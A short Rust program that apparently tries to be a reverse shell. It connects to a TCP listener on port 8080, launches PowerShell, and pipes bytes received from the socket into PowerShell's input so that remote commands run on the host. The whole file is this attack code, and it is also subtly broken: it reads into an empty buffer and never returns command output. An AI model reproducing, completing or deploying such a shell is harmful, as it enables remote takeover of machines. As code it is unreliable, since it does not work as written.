use std::io::prelude::*;
use std::net::{Shutdown, TcpStream};
use std::process::{Command, Stdio};

fn main() {
    println!("Hey");

    let mut stream = TcpStream::connect("127.0.0.1:8080")
        .expect("Server seems to be down");

    let process = Command::new("powershell")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn().unwrap();

    let buffer = &mut vec![];

    stream
        .read(buffer)
        .expect("Couldn't read powershell io");

    process.stdin.unwrap()
        .write_all(&buffer)
        .expect("Couldn't write powershell message");

    stream
        .shutdown(Shutdown::Both)
        .expect("Couldn't shutdown stream")
}
